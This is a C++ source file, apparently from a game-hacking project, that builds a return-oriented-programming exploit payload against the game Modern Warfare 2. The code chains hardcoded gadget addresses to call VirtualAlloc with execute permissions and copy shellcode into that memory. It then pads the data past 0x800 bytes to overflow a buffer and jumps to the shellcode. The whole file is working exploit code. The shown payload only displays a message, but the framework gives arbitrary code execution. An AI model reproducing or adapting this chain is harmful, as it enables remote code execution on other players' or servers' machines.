#include "STDInclude.hpp"

#include "Game/MW2/Exploit.hpp"

//#define USE_IW4X

#ifdef USE_IW4X

#define UNUSED_MEMORY_POINTER 0x64A3050
#define UNUSED_DATA_POINTER 0x64A3071
#define RESTORE_SERVER_CONTEXT 0x4B2412

#define ORG_PARAM 0x31D9390

#else

#define UNUSED_MEMORY_POINTER 0x642D718
#define UNUSED_DATA_POINTER 0x642D738
#define RESTORE_SERVER_CONTEXT 0x56A092

#define ORG_PARAM 0x3172010

#endif

namespace Game
{
	namespace MW2
	{
		void Exploit::allocateMemory(std::vector<DWORD>* stack, DWORD address, DWORD size)
		{
			// Allocate executable memory
			stack->push_back(0x401000 + 0x00077a0a);  // pop esi
			stack->push_back(0x67D1E4);               // IAT: VirtualAlloc

			stack->push_back(0x401000 + 0x0017f5c8);  // mov eax, [esi]; pop esi
			stack->push_back(0);                      // padding

			stack->push_back(0x401000 + 0x000ded54);  // jmp eax

			stack->push_back(0x401000 + 0x00077a0a);  // pop esi - for saving the memory pointer

			stack->push_back(0);                      // addr
			stack->push_back(size);                   // size
			stack->push_back(MEM_COMMIT);             // addr
			stack->push_back(PAGE_EXECUTE_READWRITE); // permissions

													  // Save memory pointer
			stack->push_back(address);                // Target address
			stack->push_back(0x401000 + 0x00193450);  // mov [esi], eax
		}

		void Exploit::writeDataInEax(std::vector<DWORD>* stack, std::string data)
		{
			while (data.size() % 4) data.push_back(0);
			for (size_t i = 0; i < data.size(); i += 4)
			{
				stack->push_back(0x401000 + 0x000021a1);    // pop ecx
				stack->push_back(*PDWORD(data.data() + i)); // data
				stack->push_back(0x401000 + 0x00029059);    // mov [eax], ecx
				stack->push_back(0x401000 + 0x00254ab9);    // add eax, 3
				stack->push_back(0x401000 + 0x00064844);    // add eax, 1
			}
		}

		void Exploit::freeMemory(std::vector<DWORD>* stack, DWORD address)
		{
			stack->push_back(0x401000 + 0x00249982); // pop edx
			stack->push_back(address);

			stack->push_back(0x401000 + 0x001ccb8c); // mov eax, [edx]

			stack->push_back(0x401000 + 0x00249982); // pop edx
			stack->push_back(0x5B7880); // Z_VirtualFreeInternal

			stack->push_back(0x401000 + 0x00000039); // mov [esp + 4], eax; jmp edx

			stack->push_back(0x401000 + 0x00249982); // pop edx
			stack->push_back(0); // placeholder
		}

		void Exploit::writeData(std::vector<DWORD>* stack, DWORD address, std::string data)
		{
			data.push_back(0);
			while (data.size() % 4) data.push_back(0);

			stack->push_back(0x401000 + 0x00077a0a); // pop esi

			for (unsigned int i = 0; i < data.size(); i += 4)
			{
				stack->push_back(*(DWORD*)(data.data() + i));
				stack->push_back(0x401000 + 0x000421fe); // pop eax
				stack->push_back(address + i);
				stack->push_back(0x401000 + 0x00077a08); // mov [eax], esi; pop esi
			}

			stack->push_back(0);
		}

		std::string Exploit::buildPayload()
		{
			std::vector<DWORD> stack;

			// Quit
			//stack.push_back(0x5C96BA);

			this->freeMemory(&stack, UNUSED_MEMORY_POINTER);
			this->writeData(&stack, UNUSED_DATA_POINTER, "Helloooooo Man");

			stack.push_back(0x5CB620);              // Sys_ShowErrorText
			stack.push_back(0x401000 + 0x00249982); // pop edx
			stack.push_back(UNUSED_DATA_POINTER);   // message

			stack.push_back(RESTORE_SERVER_CONTEXT); // restore server

			static unsigned char shellcode[] =
			{
				0x81, 0xEC, 0x70, 0x08, 0x00, 0x00, // sub esp, 870h
				0xC3                                // retn
			};

			std::vector<DWORD> fixup;
			fixup.push_back(0x56991E);  // pop eax
			fixup.push_back(ORG_PARAM); // old param? not really, but whatever

			this->allocateMemory(&fixup, UNUSED_MEMORY_POINTER, (sizeof(shellcode) + 3) & ~3);
			this->writeDataInEax(&fixup, std::string((char*)shellcode, sizeof shellcode));

			// Execute shellcode
			fixup.push_back(0x401000 + 0x00249982); // pop edx
			fixup.push_back(UNUSED_MEMORY_POINTER);
			fixup.push_back(0x401000 + 0x001ccb8c); // mov eax, [edx]

			fixup.push_back(0x401000 + 0x000ded54); // jmp eax

			std::string data;
			data.append(LPSTR(stack.data()), stack.size() * 4);
			data.resize(0x800); // Exceed 0x800 bytes
			data.append(LPSTR(fixup.data()), fixup.size() * 4);

			return data;
		}
	}
}
